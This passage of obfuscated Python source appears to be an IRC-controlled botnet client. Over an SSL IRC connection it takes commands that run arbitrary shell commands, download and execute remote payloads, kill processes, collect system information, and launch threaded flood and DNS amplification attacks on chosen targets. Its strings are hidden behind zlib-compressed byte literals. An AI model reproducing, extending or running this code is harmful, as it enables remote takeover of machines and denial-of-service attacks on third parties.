                            ZOzCsxfk[bJHNVcZc][biVijZHPQ] = {}
                        for QVPsPdcha in self.zZfuQaLo:
                            amp = self.YphhpXFPZAA(QVPsPdcha)
                            self.aMHPyhNd(sock, biVijZHPQ, bJHNVcZc, amp)
                    else:
                        amp = CocMZFBnHq[bJHNVcZc]
                        self.aMHPyhNd(sock, biVijZHPQ, bJHNVcZc, amp)
                else:
                    cvmhhxhhV[bJHNVcZc][yELscaVhUe].seek(0)
            except:
                pass
        try:
            sock.close()
            for bJHNVcZc in cvmhhxhhV:
                cvmhhxhhV[bJHNVcZc][yELscaVhUe].close()
        except:
            pass
    def bVBEFajh(self, ip, port):
        pass
    def KRdpdjVYoxPh(self, cmd):
        try:
            acKsZZoFm = subprocess.Popen(cmd,stdout=subprocess.PIPE,shell=True)
            while True:
                hsdsdiuoWsAU = acKsZZoFm.stdout.readline()
                if acKsZZoFm.poll() is not None and hsdsdiuoWsAU == '':
                    break
                if hsdsdiuoWsAU:
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x75\x77\xf7\x06\x00\x18\x4b\x03\x9d')) % (self.lAyMzJrw,hsdsdiuoWsAU.strip()))
        except Exception as e:
            self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x09\xd5\xb0\x67\xe7\x0d\x32\xf4\x49\x10\x93\x57\x62\x11\x77\x50\x29\x66\x64\x93\xd7\x70\xd2\x13\xf7\xf4\x05\x00\x9c\xe5\x07\x9b')) % self.lAyMzJrw)
    def iPsdSFxEcg(self, FdAoOldyPg):
        try:
            if FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x63\x13\xd5\x0a\x33\x01\x00\x09\x6f\x01\xd6')):
                HFpPabdolog=-1
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x0b\xcc\x11\x12\x97\x95\xd2\x0a\xd4\xe4\x64\x33\xe6\xe3\x8d\x4a\x54\x10\xe7\x12\x54\x08\x30\x16\x15\xd2\xce\x05\x00\xa0\x10\x07\x77')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe7\x65\x52\xf6\xd7\x97\x61\x06\x00\x0d\x0f\x01\xdf')):
                threading.Thread(target=self.nGdiRilqMfv,args=(FdAoOldyPg[4],int(FdAoOldyPg[5]),int(FdAoOldyPg[6]),)).start()
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x74\x50\x50\x14\xe3\x11\x4b\x2d\x63\x51\x76\x57\xe4\xe6\x8d\x56\x2d\xe6\x65\x0f\x4a\x08\xa8\x0a\x13\xf1\x05\x00\x9f\x06\x08\x6a')) % (self.lAyMzJrw,FdAoOldyPg[4],FdAoOldyPg[5]))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\x14\x90\x51\xf6\xd7\x97\x61\x06\x00\x0d\x90\x01\xf6')):
                for i in range(0, int(FdAoOldyPg[7])):
                    threading.Thread(target=self.koONMfazohB,args=(FdAoOldyPg[4],int(FdAoOldyPg[5]),int(FdAoOldyPg[6],))).start()
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x74\x50\x50\x14\xe3\x11\x4b\x2d\x90\xb4\x75\x57\xe4\xe6\x8d\x56\x2d\xe6\x65\x0f\x4a\x08\xa8\x02\xca\x09\x70\x3b\x68\x16\xbb\x4b\x05\x19\x7a\x1b\x89\xb1\x29\x8b\x64\x00\x00\x46\x92\x0b\xc0')) % (self.lAyMzJrw,FdAoOldyPg[4],FdAoOldyPg[5],FdAoOldyPg[7]))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe3\x62\x52\xf6\xd7\x97\x61\x06\x00\x0c\xf2\x01\xdb')):
                for i in range(0, int(FdAoOldyPg[7])):
                    threading.Thread(target=self.pXoNCaVoWOF,args=(FdAoOldyPg[4],int(FdAoOldyPg[5]),int(FdAoOldyPg[6],))).start()
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x74\x50\x50\x14\xe3\x11\x4b\x2d\x67\x56\x76\x57\xe4\xe6\x8d\x56\x2d\xe6\x65\x0f\x4a\x08\xa8\x02\xca\x09\x70\x3b\x68\x16\xbb\x4b\x05\x19\x7a\x1b\x89\xb1\x29\x8b\x64\x00\x00\x41\x41\x0b\x97')) % (self.lAyMzJrw,FdAoOldyPg[4],FdAoOldyPg[5],FdAoOldyPg[7]))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\x64\x95\x35\xf2\xd7\x67\xe4\x33\x01\x00\x0f\x88\x02\x1f')):
                threading.Thread(target=self.vJcKcoxAYdh,args=(FdAoOldyPg[4],int(FdAoOldyPg[5]),int(FdAoOldyPg[6],))).start()
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x74\x50\x50\x14\xe3\x11\x4b\x2d\xd0\x91\x11\xd0\xe6\x10\x88\x35\x2a\xe6\x65\x0f\x4a\x08\x48\x60\xe1\x33\xe6\x77\x12\x34\x2a\x16\x64\x13\xd4\x73\x33\x61\xc8\x05\x00\x12\x15\x0a\x1f')) % (self.lAyMzJrw,FdAoOldyPg[4],FdAoOldyPg[5]))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x92\x65\x33\x75\xd5\x91\xe1\x50\x06\x00\x0f\x70\x02\x13')):
                for i in range(0, int(FdAoOldyPg[7])):
                    threading.Thread(target=self.xykGjfUc,args=(FdAoOldyPg[4],FdAoOldyPg[5],int(FdAoOldyPg[6]),)).start()
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x74\x50\x50\x14\xe3\x11\x4b\xcd\x16\x51\x37\x4f\x67\xe4\x8b\xd6\x33\x77\x62\x93\x49\x2d\x13\xb2\x8f\x4d\x77\x12\x14\x31\xb3\x12\x63\x0c\x4a\x08\x48\x60\xe7\x37\x65\x62\x0e\x30\x8a\x04\x00\x62\xe7\x0b\xf5')) % (self.lAyMzJrw,FdAoOldyPg[4],FdAoOldyPg[7]))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x63\x13\x56\x74\xd2\x65\x06\x00\x0a\xd0\x01\xb3')):
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x8b\x36\xb3\xe5\x63\x13\x56\xf4\xd2\x13\x71\x4f\x12\x71\x8a\xd0\x50\x10\xf3\x14\x31\xf7\xd1\x0d\x76\x32\xc9\x05\x00\xa8\x33\x08\x84')) % (self.lAyMzJrw,FdAoOldyPg[4],FdAoOldyPg[5]))
                threading.Thread(target=urllib.request.urlretrieve, args=(FdAoOldyPg[5], "."+FdAoOldyPg[4],)).start()
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe0\x11\xd4\xf2\xd5\x13\x63\x31\x06\x00\x0f\x4f\x02\x18')):
                dPvOAiUfH = 0
                try:
                    self.AbJppCRv.close()
                except:
                    pass
                self.QencfIfkM()
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x65\x66\x61\x02\x00\x04\x73\x01\x02')):
                try:
                    if not os.path.exists(b"."+FdAoOldyPg[4]):
                        self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x8a\x50\x31\x12\xe4\x09\xd2\xf4\x51\x14\x77\x37\xe6\xe7\x76\x4f\x54\x97\x96\x14\x4f\xf5\x51\x0b\x66\xd3\x12\x77\x8a\xd0\x50\x10\xf3\x14\xd1\x09\x34\x66\xf7\xf4\x05\x00\x1f\xdb\x0a\x81')) % (self.lAyMzJrw))
                        return
                    zZfuQaLo=wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x37\x13\xe3\x97\xd3\x89\xce\x13\xe0\xd0\xf2\x96\x8e\x36\x51\x17\xe7\x16\xcf\x76\xd0\x97\xf3\x56\x64\x63\x0c\x54\xb6\xe1\x65\x8a\x51\xf3\xd1\x8d\x67\xd0\xe0\x60\x8d\x50\xa9\x65\x64\x93\xcf\x8c\x52\x94\xe6\xd0\xf0\x64\x8c\xd6\x01\x00\x22\xf5\x0a\x0d')).split(b",")
                    bJHNVcZc = FdAoOldyPg[4]
                    if FdAoOldyPg[4] == "dns":
                        try:
                            zZfuQaLo = FdAoOldyPg[8].split(b",")
                        except:
                            pass
                    jmaoaichDJ[FdAoOldyPg[4]] = ["."+FdAoOldyPg[4]]
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x74\x50\x50\x14\xe3\x11\x4b\x65\x33\x0e\x66\xd3\x12\x77\x0a\xd2\xb5\xe1\xe5\x0d\xd2\xf2\x05\xca\xf9\x02\x00\x99\x3f\x07\xdd')) % (self.lAyMzJrw,FdAoOldyPg[4],FdAoOldyPg[5]))
                    self.ddevkYedee(socket.gethostbyname(FdAoOldyPg[5]), int(FdAoOldyPg[6]), zZfuQaLo, int(FdAoOldyPg[7]))
                except:
                    pass
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe4\x12\xd6\xf6\x55\x65\x04\x00\x0b\x34\x01\xc5')):
                if FdAoOldyPg[4]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x36\x13\x94\x91\x57\x00\x00\x03\x3c\x00\xd6')):
                    EahdvJPb=1
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x0c\x57\xb0\xe5\xe1\x61\x48\x0d\x54\x65\x10\xd2\x62\x62\x13\xf5\x06\x00\x56\x28\x05\x40')) % (self.lAyMzJrw))
                else:
                    EahdvJPb=0
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x0c\x57\xb0\xe5\xe1\x61\x48\x0d\x56\x64\x13\x51\x62\x76\xb6\x03\x00\x51\x90\x05\x5a')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe4\x12\xd6\xf6\x55\x65\x17\x55\xe3\x64\x0d\x04\x00\x15\xa8\x02\x65')):
                threading.Thread(target=self.mvCyxlNc,args=(FdAoOldyPg[4],FdAoOldyPg[5],FdAoOldyPg[6],)).start()
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe4\x12\xd6\x0e\x30\x11\x12\x36\x01\x00\x0f\x96\x02\x2f')):
                try:
                    if FdAoOldyPg[4] == wzihKxgDoV(zlib.decompress(b'\x78\x9c\x53\xb0\xe7\x03\x00\x00\xef\x00\x6e')):
                        osgmgTQwCoCg=""
                        ZypbcwjGJo=0
                        YWSClVuh=0
                        YWSClVuh = 0
                        for wVgPjyzf,KYlOFYdnKToa in enumerate(self.exploitstats):
                            if KYlOFYdnKToa != "default":
                                osgmgTQwCoCg+=KYlOFYdnKToa + wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x2d\x06\x00\x01\x4f\x00\xe1'))
                                szZHobHLluWC,dlidvcXL=self.exploitstats[KYlOFYdnKToa]
                                ZypbcwjGJo+=szZHobHLluWC
                                YWSClVuh+=dlidvcXL
                        if osgmgTQwCoCg != wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x2d\x06\x00\x01\x4f\x00\xe1')):
                            self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\xd5\x4e\x49\x64\x64\x66\x17\x55\x08\x48\x60\x60\x51\xe3\xe4\x09\x54\xcd\x74\xf2\x61\x4c\x0d\xd7\x67\x67\xd3\x76\x67\x8e\xd0\x2d\x16\x63\x90\x57\x60\xe6\x54\x16\x49\x17\x61\x0c\xd5\xb7\x65\xe7\xf5\x48\x65\x33\x8e\x77\x37\xe6\x10\x0b\xd5\x2d\x66\x61\x63\xd7\x76\x4f\x90\x11\x57\xe2\x8c\x10\x49\x51\xc8\x00\x00\xc7\xe4\x10\x0a')) % (self.lAyMzJrw, osgmgTQwCoCg,str(ZypbcwjGJo), str(YWSClVuh)))
                        else:
                            self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x0c\x57\xb0\xe5\xe1\x61\x48\x4d\x67\x0a\x66\xd2\x12\x17\xf3\xcd\x8f\x04\x00\x5f\x23\x06\x50')) % (self.lAyMzJrw))
                    elif self.exploitstats[FdAoOldyPg[4]][0]:
                        self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x0c\x57\xb0\xe5\xe1\x61\x48\x0d\x30\x11\x12\x36\x71\x67\x89\x36\xce\x74\xf2\x61\x34\xf4\x31\x11\xe2\x4e\x17\x61\x0c\xd5\xb7\x65\xe7\xf5\x48\x65\x33\x8e\x77\x37\xe6\x10\x0b\xd5\x2d\xe6\x95\x14\xd7\x96\x04\xea\xf3\x05\x00\xca\x40\x0d\x5d')) % (self.lAyMzJrw, FdAoOldyPg[4], str(self.exploitstats[FdAoOldyPg[4]][0]), str(self.exploitstats[FdAoOldyPg[4]][1])))
                except:
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\xd5\x89\x4e\x54\x60\xe4\x90\xd1\x76\x33\x0a\x16\x31\x66\x13\x73\x4f\x34\xe5\x95\xf6\x48\x65\x33\xae\x04\x00\x8f\xdc\x07\xae')) % (self.lAyMzJrw, FdAoOldyPg[4]))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x65\x64\x15\x57\x09\x34\x16\x60\xd3\x04\x00\x0e\xa6\x01\xfd')):
                self.exploitstats={"default":[0,0]}
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x0c\x57\xb0\xe5\xe1\x61\x48\x4d\x67\x0a\x66\xd2\x12\x17\x8b\x55\x31\xf7\x49\x06\x00\x6b\x7c\x06\xa2')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe0\x61\x31\xf3\x56\x95\xe7\x06\x00\x0d\x1b\x01\xe9')):
                threading.Thread(target=self.bVBEFajh, args=(FdAoOldyPg[4],FdAoOldyPg[5],)).start()
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\x64\x97\x56\x76\x55\x65\x04\x00\x0b\x12\x01\xba')):
                if platform.system() != wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\xb3\xe2\xe1\x95\x35\x0a\x00\x00\x03\x78\x01\x09')):
                    if FdAoOldyPg[4]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\x36\x13\x94\x91\x57\x00\x00\x03\x3c\x00\xd6')):
                        FxaVWiFiJH=0
                        self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x8c\xd2\x30\x65\xe1\x61\x48\x0d\x54\x65\x10\xd2\x62\x62\x13\xf5\x06\x00\x55\xf8\x05\x3b')) % (self.lAyMzJrw))
                    else:
                        FxaVWiFiJH=1
                        self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x8c\xd2\x30\x65\xe1\x61\x48\x0d\x56\x64\x13\x51\x62\x76\xb6\x03\x00\x51\x65\x05\x55')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\x64\x14\xd7\xf4\x07\x00\x07\x91\x01\x9a')):
                threading.Thread(target=self.KRdpdjVYoxPh,args=(b" ".join(FdAoOldyPg[4:]),)).start()
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x65\x63\x63\xd5\xf6\xd7\x17\x62\x06\x00\x0c\x7c\x01\xc8')):
                try:
                    urllib.request.urlretrieve(FdAoOldyPg[4],FdAoOldyPg[5])
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x8b\x36\xb3\xe5\x63\x13\x56\x74\x53\x89\xcd\x05\x00\x3d\xcf\x05\x34')) % (self.lAyMzJrw))
                except:
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x8c\x36\xb1\x67\xf3\x94\xd1\x0a\x4f\x10\xe7\x30\xe0\xe4\x8b\x56\x30\x77\x4e\x06\x00\x6e\x68\x06\xbd')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x64\x90\xd3\xf4\xb3\x14\x93\x53\x12\x67\x0f\x34\x51\xe0\x66\x17\xd5\xf5\xd1\x14\x00\x00\x33\x5a\x03\xc2')):
                sys.exit(1)
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x65\x17\x14\x57\x0b\x33\x11\x03\x00\x0b\x66\x01\xee')):
                try:
                    urllib.request.urlretrieve(FdAoOldyPg[4],FdAoOldyPg[5])
                    if not platform.System.startswith(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\xb3\xe2\xe1\x95\x35\x0a\x00\x00\x03\x78\x01\x09'))):
                        try:
                            os.chmod(FdAoOldyPg[5], 777)
                        except:
                            pass
                    subprocess.Popen([(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x51\x00\x00\x00\xea\x00\x85')) % FdAoOldyPg[5])])
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x8b\x36\xb3\xe5\x63\x13\x56\x74\x53\x09\x66\xd3\x64\x76\x0a\xb4\x34\x63\x94\x61\x53\x70\xcf\xab\x04\x00\x8a\x9c\x07\x62')) % (self.lAyMzJrw))
                except:
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x8c\x36\xb1\x67\xf3\x94\xd1\x0a\x4f\x10\xe7\x30\xe0\xe4\x8b\x56\x30\x77\x62\x63\x48\x75\xb3\x10\x63\x31\x12\x66\x17\xf5\x06\x00\xbe\xc8\x08\x08')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x64\x90\xd3\x74\xb4\x94\x65\xd3\x62\x02\x00\x11\x17\x02\x12')):
                os.popen(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x33\xb4\xe0\x66\x95\x4b\xe5\xab\x0c\xf6\x52\x74\x77\x77\x07\x00\x14\x59\x03\x17')) % FdAoOldyPg[4])
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\xd5\x8c\xd5\xb5\x67\xe7\x8d\xf1\x07\x00\x2b\xd7\x04\x75')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x64\x90\xd3\x74\xb4\x64\xe6\x53\x06\x00\x0e\xc0\x01\xf7')):
                os.kill(int(FdAoOldyPg[4]),9)
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\xd5\x8c\xd5\xb5\x67\xe7\x8d\xf1\x07\x00\x2b\xd7\x04\x75')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x65\x63\x60\x54\x71\xd4\x11\x03\x00\x0a\x34\x01\xa7')):
                self.AELmEnMe=1
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x8b\x35\x32\x62\x60\x15\x57\x64\x56\x64\x17\x56\x63\xe1\x74\x4f\x34\xe2\xe1\x0d\x32\x73\x50\x94\x15\x49\xcb\x05\x00\x93\xac\x07\x39')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x65\x67\x17\x56\xf7\x57\x05\x00\x09\x1c\x01\xb5')):
                self.AELmEnMe=0
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x08\xcc\x31\xe3\xe1\x10\xd0\x74\x53\x09\x66\x33\x16\x66\x0e\xd7\x52\x70\xe2\x90\x51\x64\x36\x16\x60\xd3\x14\x71\xb6\x03\x00\xb0\x0b\x07\x72')) % (self.lAyMzJrw))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x65\xe5\x61\xd3\x09\x06\x00\x07\x58\x01\x8f')):
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x75\x77\xf7\x06\x00\x18\x4b\x03\x9d')) % (self.lAyMzJrw,urllib.request.urlopen(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\x54\x17\x93\x64\xac\xe7\xc9\x17\x12\xd7\xf3\xe4\x76\xd1\x30\x95\x76\x97\x35\x77\x01\x00\x27\x00\x03\xc1'))).read()))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe0\x90\x07\x00\x04\xbf\x01\x30')):
                HFhxNdPfKf = dict((i.split()[0].rstrip(':'),int(i.split()[1])) for i in open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x53\x16\x60\x13\xcc\xf2\x53\x95\xe3\xd3\x64\xe4\x05\x00\x10\x74\x01\xf9'))).readlines())
                oSdZcxwA = HFhxNdPfKf[wzihKxgDoV(zlib.decompress(b'\x78\x9c\xe3\x31\xe3\xb7\x95\x35\x74\xd2\x01\x00\x05\x24\x01\x4b'))]
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x75\x77\x4f\x94\x53\xf0\x54\x60\xc9\x4b\x60\xe7\x30\x66\xe3\x93\xf2\x06\x00\x5d\x62\x05\xe7')) % (self.lAyMzJrw, oSdZcxwA/1024))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\xe5\x66\x17\xd1\x02\x00\x05\xec\x01\x49')):
                hkpTQfKPTa=""
                hkpTQfKPTa+=wzihKxgDoV(zlib.decompress(b'\x78\x9c\x63\x50\x64\x64\x94\x36\x74\x53\x66\x17\x32\x65\x8a\x10\x01\x00\x09\xe0\x01\x95')) + platform.architecture()[0]
                hkpTQfKPTa+=wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x94\x63\xe6\x92\xd2\xf1\x55\xf5\x74\x07\x00\x09\x34\x01\xd5')) + platform.machine()
                hkpTQfKPTa+=wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x94\xe5\xe5\x15\xaf\x67\x06\x00\x05\x17\x01\x32')) + platform.node()
                hkpTQfKPTa+=wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x64\x90\x96\x62\x53\xf0\xab\x0a\x06\x00\x07\x9a\x01\xd8')) + platform.system()
                try:
                    dist = platform.dist()
                    dist = " ".join(x for x in dist)
                    hkpTQfKPTa+=wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x14\xe7\x96\x62\x33\xf7\x52\x62\x13\xd6\xe3\xe0\xe1\x4b\x04\x00\x11\x1c\x02\x11')) + dist
                except:
                    pass
                hkpTQfKPTa+=wzihKxgDoV(zlib.decompress(b'\x78\x9c\x4b\x54\x16\x60\x13\x54\x08\x30\x96\x11\x35\x89\x75\x02\x00\x0e\xfd\x02\x53'))
                with open(wzihKxgDoV(zlib.decompress(b'\x78\x9c\xcb\x53\x16\x60\x13\xcc\x72\x30\x60\xe3\xd3\x64\xe4\x05\x00\x0f\xdc\x01\xde')), "r")  as f:
                    info = f.readlines()
                IhmINWdio = [x.strip().split(b":")[1] for x in info if wzihKxgDoV(zlib.decompress(b'\x78\x9c\xd3\xb1\x61\xe3\x91\x4b\xf5\x55\x94\x63\x02\x00\x08\xe4\x01\x8c'))  in x]
                fLwfvoUlH=[]
                last = len(IhmINWdio)
                for wVgPjyzf, item in enumerate(IhmINWdio):
                    if item not in fLwfvoUlH:
                        fLwfvoUlH.append(item)
                        hkpTQfKPTa+=str(wVgPjyzf) + "-" + str(last) +  item
                    last-=1
                self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x75\x77\xf7\x06\x00\x18\x4b\x03\x9d')) % (self.lAyMzJrw, hkpTQfKPTa))
            elif FdAoOldyPg[3]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\xab\xae\x15\xe0\x61\x52\x71\xd0\x06\x00\x09\x06\x01\xa6')):
                try:
                    fuKpCZcxj()
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x35\x08\x34\x34\x62\x64\x12\x57\x64\x56\x96\x61\x56\x72\xcb\x00\x00\x48\xaf\x04\xf8')) % (self.lAyMzJrw))
                except:
                    self.AbJppCRv.send(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x64\xd4\xb6\xb7\x17\x4b\x49\x08\x13\x49\x8f\x55\x09\xd5\xb0\x67\xe7\x0d\x32\xf4\x49\x60\x64\x32\x67\x63\x8c\xcf\x8f\x04\x00\x5f\xa3\x06\x4f')) % (self.lAyMzJrw))
        except IndexError:
            pass
    def QencfIfkM(self):
        print('irc loop')
        global FxaVWiFiJH
        dbdLMAdToo=""
        self.AbJppCRv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.AbJppCRv.connect((self.YxqCRypO, self.EQGAKLwR))
        self.AbJppCRv=ssl.ssl(self.AbJppCRv)
        self.AbJppCRv.recv(2048)
        dPvOAiUfH = 0
        HFpPabdolog=-1
        self.AbJppCRv.send(bytes(str("USER "  + self.aRHRPteL + " " + self.YxqCRypO + " " + self.pBYbuWVq + " :localhost\n"), 'utf-8'))
        self.AbJppCRv.send(bytes("NICK %s\n" % self.hLqhZnCt, 'utf-8'))
        while 1:
            try:
                dbdLMAdToo=dbdLMAdToo+str(self.AbJppCRv.recv(2048))
                uoRJfvjo=dbdLMAdToo.split("\n")
                dbdLMAdToo=uoRJfvjo.pop( )
                print(dbdLMAdToo)
                print (uoRJfvjo)
                for FdAoOldyPg in uoRJfvjo:
                    FdAoOldyPg=FdAoOldyPg.rstrip()
                    FdAoOldyPg=FdAoOldyPg.split()
                    if FdAoOldyPg[0]==wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x94\xd2\xd1\x03\x00\x01\x1c\x00\x86')):
                        self.AbJppCRv.send(bytes(wzihKxgDoV(zlib.decompress(b'\x78\x9c\x13\x94\xd1\xd1\x0b\x4a\x08\xf0\x02\x00\x06\x94\x01\xd4'))) % FdAoOldyPg[1])
